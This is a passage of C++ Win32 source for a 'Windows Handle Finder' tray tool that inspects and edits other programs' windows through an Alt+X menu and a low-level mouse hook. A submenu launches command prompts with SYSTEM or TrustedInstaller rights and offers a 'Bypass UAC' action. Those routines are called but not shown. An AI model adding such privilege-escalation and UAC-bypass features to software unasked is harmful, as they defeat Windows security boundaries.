    RECT rect = { 0, 0, 680, 0 };
    HDC hdc = GetDC(GetDesktopWindow());
    if (!hdc) return 0;
    HFONT hOld = (HFONT)SelectObject(hdc, hFont);
    DrawTextW(hdc, text, -1, &rect, DT_CALCRECT | DT_WORDBREAK | DT_LEFT | DT_TOP);
    SelectObject(hdc, hOld);
    ReleaseDC(GetDesktopWindow(), hdc);
    return (rect.right - rect.left)+6;
}
BOOL AppendWideString(WCHAR* pBuffer, size_t bufferSize, const WCHAR* pFormat, ...)
{
	// 参数合法性检查
	if (pBuffer == nullptr || bufferSize == 0 || pFormat == nullptr)
	{
		SetLastError(ERROR_INVALID_PARAMETER);
		return FALSE;
	}

	// 1. 获取原有字符串长度
	size_t currentLength = wcslen(pBuffer);

	// 检查缓冲区剩余空间是否足够（至少留1个位置给终止符）
	if (currentLength >= bufferSize - 1)
	{
		SetLastError(ERROR_INSUFFICIENT_BUFFER);
		return FALSE;
	}

	// 2. 准备可变参数列表
	va_list args;
	va_start(args, pFormat);

	// 3. 从当前字符串末尾开始追加内容
	// swprintf_s返回实际写入的字符数（不含终止符），失败返回-1
	int written = _vsnwprintf_s(
		pBuffer + currentLength,      // 写入起始位置（原有字符串末尾）
		bufferSize - currentLength,   // 剩余可用缓冲区大小
		_TRUNCATE,                    // 超出时截断（可选，也可直接限制长度）
		pFormat,                      // 格式化字符串
		args                          // 可变参数
	);

	va_end(args);

	// 检查写入是否成功
	if (written < 0)
	{
		SetLastError(ERROR_INVALID_DATA);
		return FALSE;
	}

	return TRUE;
}
int main() {
	SetThemeAppProperties(STAP_ALLOW_NONCLIENT | STAP_ALLOW_WEBCONTENT | STAP_ALLOW_CONTROLS);
	MSG msg;
	basic_ios<char, char_traits<char>>::sync_with_stdio(false);
	if (true) {
		typedef int(__stdcall* SetPreferredAppModeProc)(int);
		SetPreferredAppModeProc SetPreferredAppMode = (SetPreferredAppModeProc)GetProcAddress(LoadLibraryExW(L"uxtheme.dll", 0, 2048), MAKEINTRESOURCEA(135));
		SetPreferredAppMode(true);
	}
	HWND hwnd = CreateWindowExW(257, L"#32770", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
	SetWindowLongPtrW(hwnd, -4, (long long)(WNDPROC([](HWND hwnd, unsigned int msg, WPARAM wparam, LPARAM lparam)->LRESULT {
		switch (msg) {
		case (WM_USER + 1): {
			if (lparam == WM_RBUTTONUP) {
				POINT pt;
				GetCursorPos(&pt);
				hmenu = CreatePopupMenu();
				AppendMenuW(hmenu, MF_STRING, 0, L"Windows Handle Finder (C++ 版)");
				if (IsUserAnAdmin()) {
					AppendMenuW(hmenu, MF_STRING, 0, L"程序正在以管理员身份运行。");
				}
				AppendMenuW(hmenu, MF_STRING, 0, L"野生坤坤没头像制作。");
				AppendMenuW(hmenu, MF_SEPARATOR, 0, 0);
				AppendMenuW(hmenu, MF_STRING, 0xF000, L"退出");
				SetThemeAppProperties(0);
				TrackPopupMenu(hmenu, TPM_BOTTOMALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, hwnd, NULL);
				SetThemeAppProperties(STAP_ALLOW_NONCLIENT | STAP_ALLOW_WEBCONTENT | STAP_ALLOW_CONTROLS);
			}
			break;
		}
		case WM_COMMAND: {
			switch (wparam) {
			case 0xF000: {
				SendMessageW(hwnd, WM_DESTROY, 0, 0);
				return 0;
			}
			}
			break;
		}
		case WM_HOTKEY: {
			if (wparam == HOTKEY_ID) {
				log((L"GetForegroundWindow: " + to_wstring(int(hwndCur))).c_str());
				hmenu = CreatePopupMenu();
				hwndCur = GetForegroundWindow();
				wchar_t title[33]{};
				GetWindowTextW(hwndCur, title, 33);
				wstring t = title;
				if (wstring(title).size() >= 32) {
					t.resize(32);
					t += L"...";
					AppendMenuW(hmenu, MF_STRING, 2, (L"窗口标题: " + t).c_str());
				}
				else {
					AppendMenuW(hmenu, MF_STRING, 2, (wstring(L"窗口标题: ") + title).c_str());
				}
				AppendMenuW(hmenu, MF_STRING, 1, (L"窗口句柄: " + to_wstring(DWORD(hwndCur))).c_str());
				LONG_PTR style = GetWindowLongPtrW(hwndCur, -16);
				AppendMenuW(hmenu, MF_STRING, 3, (L"窗口样式: " + to_wstring(DWORD(style))).c_str());
				LONG_PTR styleex = GetWindowLongPtrW(hwndCur, -20);
				AppendMenuW(hmenu, MF_STRING, 4, (L"窗口扩展样式: " + to_wstring(DWORD(styleex))).c_str());
				HMENU hmenuCur = GetSystemMenu(hwndCur, false);
				AppendMenuW(hmenu, MF_STRING, 5, (L"系统菜单: " + to_wstring(DWORD(hmenuCur))).c_str());
				AppendMenuW(hmenu, MF_SEPARATOR, 0, 0);
				HMENU thmenu = CreatePopupMenu();
				AppendMenuW(thmenu, MF_STRING, 6, L"还原(&R)");
				AppendMenuW(thmenu, MF_STRING, 7, L"移动(&M)");
				AppendMenuW(thmenu, MF_STRING, 8, L"大小(&S)");
				AppendMenuW(thmenu, MF_STRING, 9, L"最小化(&N)");
				AppendMenuW(thmenu, MF_STRING, 10, L"最大化(&X)");
				AppendMenuW(thmenu, MF_SEPARATOR, 0, 0);
				AppendMenuW(thmenu, MF_STRING, 11, L"关闭(&C)");
				AppendMenuW(thmenu, MF_SEPARATOR, 0, 0);
				AppendMenuW(thmenu, MF_STRING, 0xFFFD, L"置顶窗口(&T)");
				AppendMenuW(thmenu, MF_STRING, 0xFFFE, L"取消置顶窗口(&U)");
				AppendMenuW(thmenu, MF_SEPARATOR, 0, 0);
				AppendMenuW(thmenu, MF_STRING, 0xFFFC, L"强制关闭窗口(&K)");
				AppendMenuW(thmenu, MF_STRING | MF_DISABLED, 0, L"警告：强制关闭窗口功能可能会导致进程驻留。");
				AppendMenuW(hmenu, MF_POPUP, LONG_PTR(thmenu), L"窗口的系统菜单");
				AppendMenuW(hmenu, MF_SEPARATOR, 0, 0);
				HMENU thmenua = CreatePopupMenu();
				HMENU thmenud = CreatePopupMenu();
				for (int i = 0; i < 54; ++i) {
					AppendMenuW(thmenua, MF_STRING, 0xF0000000 + i, (wstring(L"添加：") + attributes_name[i]).c_str());
					AppendMenuW(thmenud, MF_STRING, 0xB0000000 + i, (wstring(L"移除：") + attributes_name[i]).c_str());
				}
				AppendMenuW(hmenu, MF_POPUP, LONG_PTR(thmenua), L"添加对话框属性");
				AppendMenuW(hmenu, MF_POPUP, LONG_PTR(thmenud), L"移除对话框属性");
				AppendMenuW(hmenu, MF_SEPARATOR, 0, 0);
				if (int(parenthwnd)) {
					AppendMenuW(hmenu, MF_STRING | MF_DISABLED, 12, (L"父窗口句柄：" + to_wstring(int(parenthwnd))).c_str());
					if (int(childhwnd)) {
						AppendMenuW(hmenu, MF_STRING | MF_DISABLED, 13, (L"子窗口句柄：" + to_wstring(int(childhwnd))).c_str());
						AppendMenuW(hmenu, MF_STRING, 14, L"应用并清除");
					}
					else {
						AppendMenuW(hmenu, MF_STRING, 13, L"添加为子窗口句柄");
					}
					AppendMenuW(hmenu, MF_STRING, 15, L"清除");
				}
				else {
					AppendMenuW(hmenu, MF_STRING, 12, L"添加为父窗口句柄");
				}
				AppendMenuW(hmenu, MF_STRING, 16, L"将当前窗口移动到正常桌面");
				AppendMenuW(hmenu, MF_SEPARATOR, 0, 0);
				AppendMenuW(hmenu, MF_STRING, 17, L"在此窗口上生成一个模态消息窗口");
				AppendMenuW(hmenu, MF_SEPARATOR, 0, 0);
				AppendMenuW(hmenu, MF_STRING, 18, L"强制剥离模态窗口与父窗口的连接");
				AppendMenuW(hmenu, MF_SEPARATOR, 0, 0);
				thmenua = CreatePopupMenu();
				thmenud = CreatePopupMenu();
				for (int i = 0; i < 12; ++i) {
					AppendMenuW(thmenua, MF_STRING, 0xD0000000 + i, (wstring(L"添加：") + dwmwa_name[i]).c_str());
					AppendMenuW(thmenud, MF_STRING, 0xC0000000 + i, (wstring(L"移除：") + dwmwa_name[i]).c_str());
				}
				AppendMenuW(hmenu, MF_POPUP, LONG_PTR(thmenua), L"添加 DWM 属性");
				AppendMenuW(hmenu, MF_POPUP, LONG_PTR(thmenud), L"移除 DWM 属性");
				AppendMenuW(hmenu, MF_SEPARATOR, 0, 0);
				thmenu = CreatePopupMenu();
				HMENU thmenuPrivilege = CreatePopupMenu();
				AppendMenuW(thmenuPrivilege, MF_STRING, 0x1001, L"Create Administrator Privilege command prompt");
				AppendMenuW(thmenuPrivilege, MF_STRING, 0x1002, L"Create System Privilege command prompt");
				AppendMenuW(thmenuPrivilege, MF_STRING, 0x1003, L"Create TrustedInstaller Service with System Privilege command prompt");
				AppendMenuW(thmenuPrivilege, MF_SEPARATOR, 0, 0);
				AppendMenuW(thmenuPrivilege, MF_STRING, 0x1004, L"Bypass UAC (Elevate current program privilege)");
				AppendMenuW(thmenu, MF_POPUP, LONG_PTR(thmenuPrivilege), L"Windows Privilege Tools");
				AppendMenuW(thmenu, MF_SEPARATOR, 0, 0);
				AppendMenuW(hmenu, MF_POPUP, LONG_PTR(thmenu), L"更多 Windows 工具. . . ");
				AppendMenuW(hmenu, MF_SEPARATOR, 0, 0);
				AppendMenuW(hmenu, MF_STRING, 0, L"退出菜单");
				HWND tmph = CreateWindowExW(0, L"#32770", 0, 0, 0, 0, 0, 0, GetForegroundWindow(), 0, 0, 0);
				SetWindowLongPtrW(tmph, -4, LONG_PTR(WNDPROC([](HWND hwnd, unsigned int msg, WPARAM wparam, LPARAM lparam) -> LRESULT {
					switch (msg) {
					case WM_MEASUREITEM: {
						MEASUREITEMSTRUCT* pMis = (MEASUREITEMSTRUCT*)lparam;
						if (pMis->CtlType == ODT_MENU) {
							pMis->itemHeight = 24;
							return TRUE;
						}
						return FALSE;
					}
					case WM_COMMAND: {
						if (wparam >= 0xF0000000) {
							wstring an = wstring(attributes_name[wparam - 0xF0000000]);
							log((L"Add: " + an).c_str());
							if (an.find(L"_EX_") == -1) {
								SetWindowLongPtrW(hwndCur, -16, GetWindowLongPtrW(hwndCur, -16) | attributes_index[wparam - 0xF0000000]);
							}
							else {
								SetWindowLongPtrW(hwndCur, -20, GetWindowLongPtrW(hwndCur, -20) | attributes_index[wparam - 0xF0000000]);
							}
							SendMessageW(hwndCur, WM_DEVMODECHANGE, 0, 0);
						}
						else if (wparam >= 0xD0000000) {
							wstring an = wstring(dwmwa_name[wparam - 0xD0000000]);
							log((L"Add: " + an).c_str());
							tmp = true;
							DwmSetWindowAttribute(hwndCur, dwmwa_index[wparam - 0xD0000000], &tmp, sizeof(int));
							SendMessageW(hwndCur, WM_DEVMODECHANGE, 0, 0);
						}
						else if (wparam >= 0xC0000000) {
							wstring an = wstring(dwmwa_name[wparam - 0xC0000000]);
							log((L"Del: " + an).c_str());
							tmp = false;
							DwmSetWindowAttribute(hwndCur, dwmwa_index[wparam - 0xC0000000], &tmp, sizeof(int));
							SendMessageW(hwndCur, WM_DEVMODECHANGE, 0, 0);
						}
						else if (wparam >= 0xB0000000) {
							wstring an = wstring(attributes_name[wparam - 0xB0000000]);
							log((L"Del: " + an).c_str());
							if (an.find(L"_EX_") == -1) {
								SetWindowLongPtrW(hwndCur, -16, GetWindowLongPtrW(hwndCur, -16) & ~attributes_index[wparam - 0xB0000000]);
							}
							else {
								SetWindowLongPtrW(hwndCur, -20, GetWindowLongPtrW(hwndCur, -20) & ~attributes_index[wparam - 0xB0000000]);
							}
							SendMessageW(hwndCur, WM_DEVMODECHANGE, 0, 0);
						}
						else {
							//修改窗口命令相关。
							switch (wparam) {
							case 1: {
								CopyText(to_wstring(DWORD(hwndCur)));
								break;
							}
							case 2: {
								wchar_t title[32767]{};
								GetWindowTextW(hwndCur, LPWSTR(&title), 32767);
								CopyText(title);
								break;
							}
							case 3: {
								CopyText(to_wstring(DWORD(GetWindowLongPtrW(hwndCur, -16))));
								break;
							}
							case 4: {
								CopyText(to_wstring(DWORD(GetWindowLongPtrW(hwndCur, -20))));
								break;
							}
							case 5: {
								CopyText(to_wstring(DWORD(GetSystemMenu(hwndCur, false))));
								break;
							}
							case 6: {
								SendMessageW(hwndCur, WM_SYSCOMMAND, SC_RESTORE, 0);
								break;
							}
							case 7: {
								SendMessageW(hwndCur, WM_SYSCOMMAND, SC_MOVE, 0);
								break;
							}
							case 8: {
								SendMessageW(hwndCur, WM_SYSCOMMAND, SC_SIZE, 0);
								break;
							}
							case 9: {
								SendMessageW(hwndCur, WM_SYSCOMMAND, SC_MINIMIZE, 0);
								break;
							}
							case 10: {
								SendMessageW(hwndCur, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
								break;
							}
							case 11: {
								SendMessageW(hwndCur, WM_SYSCOMMAND, SC_CLOSE, 0);
								break;
							}
							case 12: {
								parenthwnd = hwndCur;
								log((L"Set Parent window: " + to_wstring(int(parenthwnd))).c_str());
								break;
							}
							case 13: {
								childhwnd = hwndCur;
								log((L"Set Child window: " + to_wstring(int(childhwnd))).c_str());
								break;
							}
							case 14: {
								SetParent(childhwnd, parenthwnd);
								log((L"SetParent(" + to_wstring(int(childhwnd)) + L", " + to_wstring(int(parenthwnd)) + L"). Result: " + to_wstring(GetLastError()) + L".").c_str());
								SetWindowPos(childhwnd, HWND_TOP, 0, 0, 0, 0, SWP_NOSIZE | SWP_SHOWWINDOW);
								ShowWindow(childhwnd, SW_SHOW);
								SetForegroundWindow(childhwnd);
							}
							case 15: {
								parenthwnd = childhwnd = 0;
								log(L"Clear: parenthwnd = childhwnd = 0");
								break;
							}
							case 16: {
								SetParent(hwndCur, 0);
								log((L"SetParent(" + to_wstring(int(hwndCur)) + L", 0). Result: " + to_wstring(GetLastError()) + L".").c_str());
								SetForegroundWindow(hwndCur);
								break;
							}
							case 17: {
								wchar_t title[32767]{};
								GetWindowTextW(hwndCur, LPWSTR(&title), 32767);
								HWND tmph = ShowMessageBoxThread(hwndCur, L"Hello, world!                       \n\t", title, 64 | MB_SETFOREGROUND);
								SetForegroundWindow(tmph);
								break;
							}
							case 18: {
								SetWindowLongPtrW(GetParent(hwndCur), -16, GetWindowLongPtrW(GetParent(hwndCur), -16) & ~WS_DISABLED);
								SetWindowLongPtrW(hwndCur, -20, GetWindowLongPtrW(hwndCur, -20) | WS_EX_APPWINDOW);
								HWND tmph = CreateWindowExW(0, L"#32770", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
								SetParent(hwndCur, tmph);
								SendMessageW(GetParent(hwndCur), WM_SYSCOMMAND, SC_CLOSE, 0);
								SetParent(hwndCur, 0);
								SetForegroundWindow(hwndCur);
								DestroyWindow(tmph);
								break;
							}
							case 0xFFFE: {
								log(L"Untopmost window.");
								SetWindowPos(hwndCur, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_SHOWWINDOW);
								break;
							}
							case 0xFFFD: {
								log(L"Topmost window.");
								SetWindowPos(hwndCur, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_SHOWWINDOW);
								break;
							}
							case 0xFFFC: {
								log(L"Force close window.");
								HWND tmph = CreateWindowExW(0, L"#32770", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
								SetParent(hwndCur, tmph);
								SendMessageW(tmph, WM_SYSCOMMAND, SC_CLOSE, 0);
								break;
							}
							}
							//Privilege Tools相关。
							switch (wparam) {
							case 0x1001: {
								ShellExecuteW(hwnd, L"runas", L"C:\\Windows\\System32\\cmd.exe", 0, L"C:\\Windows\\System32", SW_SHOW);
								if (GetLastError()) {
									wchar_t msg[256];
									DWORD lpNumberOfCharsWritten;
									FormatMessageW(4096, 0, GetLastError(), MAKELANGID(LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED), msg, sizeof(msg), 0);
									ShowNotification(hwnd, msg, L"错误", NIIF_ERROR);
									FixedShowMessageBox(msg, L"错误", MB_ICONERROR);
								}
								break;
							}
							case 0x1002: {
								RunAsUser(L"System", L"C:\\Windows\\System32\\cmd.exe", 0);
								if (GetLastError()) {
									wchar_t msg[256];
									FormatMessageW(4096, 0, GetLastError(), MAKELANGID(LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED), msg, sizeof(msg), 0);
									FixedShowMessageBox(msg, L"错误", MB_ICONERROR);
								}
								break;
							}
							case 0x1003: {
								RunAsUser(L"TrustedInstaller", L"C:\\Windows\\System32\\cmd.exe", 0);
								if (GetLastError()) {
									wchar_t msg[256];
									FormatMessageW(4096, 0, GetLastError(), MAKELANGID(LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED), msg, sizeof(msg), 0);
									FixedShowMessageBox(msg, L"错误", MB_ICONERROR);
								}
								break;
							}
							case 0x1004: {
								BypassUAC();
								if (GetLastError()) {
									wchar_t msg[256];
									FormatMessageW(4096, 0, GetLastError(), MAKELANGID(LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED), msg, sizeof(msg), 0);
									FixedShowMessageBox(msg, L"错误", MB_ICONERROR);
								}
								else {
									ExitProcess(0);
								}
								break;
							}
							}
						}
						DestroyWindow(hwnd);
						return 0;
					}
					}
					return DefWindowProcW(hwnd, msg, wparam, lparam);
					})));
				GetCursorPos(&pt);
				TrackPopupMenu(hmenu, 0, pt.x, pt.y, 0, tmph, 0);
			}
			break;
		}
		case WM_DESTROY: {
			UnregisterHotKey(hwnd, HOTKEY_ID);
			ExitProcess(0);
			return 0;
		}
		}
		return DefWindowProcW(hwnd, msg, wparam, lparam); })));
	if (!RegisterHotKey(hwnd, HOTKEY_ID, MOD_ALT, 'X')) {
		hwnd = ShowMessageBoxThread(0, L"热键注册失败。\n程序可能已在运行，或者 Alt+X 的快捷键被占用。\n请关闭影响本程序的应用程序，然后重新启动本程序。\n\n\n\n\n                                                                                                                                ", (L"Windows Handle Finder" + (IsUserAnAdmin() ? wstring(L" (Administrator)") : wstring(L""))).c_str(), 48);
		while (IsWindow(hwnd)) {
			Sleep(10);
		}
		log(L"Program exit.");
		return 0;
	}
	htip = CreateWindowExW(WS_EX_NOACTIVATE|WS_EX_TOPMOST, L"STATIC", 0, WS_POPUP | WS_BORDER | SS_CENTER, 0, 0, 100, 50, 0, 0, GetModuleHandleW(0), 0);
	SendMessageW(htip, WM_SETFONT, WPARAM(TipFont), 1);
	hmshook = SetWindowsHookExW(WH_MOUSE_LL, [](int nCode, WPARAM wParam, LPARAM lParam) {
		if (nCode >= 0) {
			//		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
			//			if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
			//				POINT pt;
			//				GetCursorPos(&pt);
			//				//SetWindowPos(htip, HWND_TOPMOST, pt.x + 20, pt.y + 20, 0, 0, SWP_SHOWWINDOW | SWP_NOSIZE);
			//				HWND hCur = WindowFromPoint(pt);
			//				//log((L"HWND: "+to_wstring(int(hCur))+L" TITLE: "+wstring(title)).c_str());
			//				if (hCur != hprev) {
			//					hprev = hCur;
			//					DrawWindowOutline(hCur, RGB(255, 0, 0));
			//				}
			//			}
			//		}
			//		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
			//			if (!((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000))) {
			//				SetWindowPos(htip, HWND_BOTTOM, 0, 0, 0, 0, SWP_HIDEWINDOW | SWP_NOSIZE | SWP_NOMOVE);
			//				if (hborder && IsWindow(hborder)) {
			//					DestroyWindow(hborder);
			//					hborder = NULL;
			//				}
			//				hprev = NULL;
			//			}
			//		}
			if ((GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000)) {
				POINT pt;
				GetCursorPos(&pt);

				//SetWindowPos(htip, HWND_TOPMOST, pt.x + 20, pt.y + 20, 0, 0, SWP_SHOWWINDOW | SWP_NOSIZE);
				HWND hCur = WindowFromPoint(pt);
				//log((L"HWND: "+to_wstring(int(hCur))+L" TITLE: "+wstring(title)).c_str());
				if (hCur != hprev) {
					hprev = hCur;
					DrawWindowOutline(hCur, RGB(255, 0, 0));
				}
				MSLLHOOKSTRUCT* ms = (MSLLHOOKSTRUCT*)lParam;
				wchar_t buf[1024];
				swprintf_s(buf, 1024, L"句柄：%d", int(hCur));
				wchar_t title[33]{};
				GetWindowTextW(hCur, title, 33);
				AppendWideString(buf, 1024, L"\r\n标题：");
				if (wstring(title).size() >= 32) {
					title[32] = 0;
					buf[wcslen(buf)] = 0;
					wcscat_s(buf, title);
					wcscat_s(buf, L"...");
				}
				else {
					wcscat_s(buf, title);
				}
				AppendWideString(buf, 1024, L"\r\n类：");
				GetClassNameW(hCur, title, 33);
				AppendWideString(buf, 1024, title);
				AppendWideString(buf, 1024, L"\r\n样式：%d\r\n矩形：(", GetWindowLongPtrW(hCur, -16));
				RECT rc;
				GetWindowRect(hCur, &rc);
				AppendWideString(buf, 1024, L"%d, %d)-(%d, %d) %dx%d", rc.left, rc.top, rc.right, rc.bottom, rc.right - rc.left, rc.bottom - rc.top);
				SetWindowTextW(htip, buf);
				int w = GetTextWidth(TipFont, buf), h = GetTextHeight(TipFont, buf), x = ms->pt.x + 20, y = ms->pt.y + 20;
				if (ms->pt.x + w + 20 > GetSystemMetrics(SM_CXSCREEN)) {
					x -= w + 40;
				}
				if (ms->pt.y + h + 20 > GetSystemMetrics(SM_CYSCREEN)) {
					y -= h + 40;
				}
				SetWindowPos(htip, HWND_TOPMOST, x, y, w, h, SWP_SHOWWINDOW);
			} else {
				ShowWindow(htip, SW_HIDE);
				if (hborder && IsWindow(hborder)) {
					DestroyWindow(hborder);
					hborder = NULL;
				}
				hprev = NULL;
			}
		}
		return CallNextHookEx(hmshook, nCode, wParam, lParam);}, 0, 0);
	NOTIFYICONDATAW nid = { 0 };
	nid.cbSize = sizeof(NOTIFYICONDATAW);
	nid.hWnd = hwnd;
	nid.uID = 1;
	nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
	nid.uCallbackMessage = (WM_USER + 1);
	nid.hIcon = LoadIconW(0, IDI_WINLOGO);
	wcscpy_s(nid.szTip, L"Windows Handle Finder (C++ 版)");
	Shell_NotifyIconW(0, &nid);
	if (IsUserAnAdmin()) {
		PrepareForUIAccess();
	}
	//ShowNotification(hwnd, (L"Windows Handle Finder" + (IsUserAnAdmin() ? wstring(L" (Administrator)") : wstring(L""))).c_str(), L"按 Alt+X 打开属性设置面板", NIIF_INFO);
	ShowMessageBoxThread(0, L"欢迎使用 Windows Handle Finder！\n按 Alt+X 打开属性设置面板。\n你可以使用这个工具编辑外部窗口，包括这个窗口。你可以添加、移除属性。本工具仅限开发者测试 Windows API 使用。\n野生坤坤没头像制作。\n\n\n\n\n\n\n\n\t", (L"Windows Handle Finder" + (IsUserAnAdmin() ? wstring(L" (Administrator)") : wstring(L""))).c_str(), 64);
	while (GetMessageW(&msg, 0, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
	return msg.wParam;
}
int WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {
	return main();
}
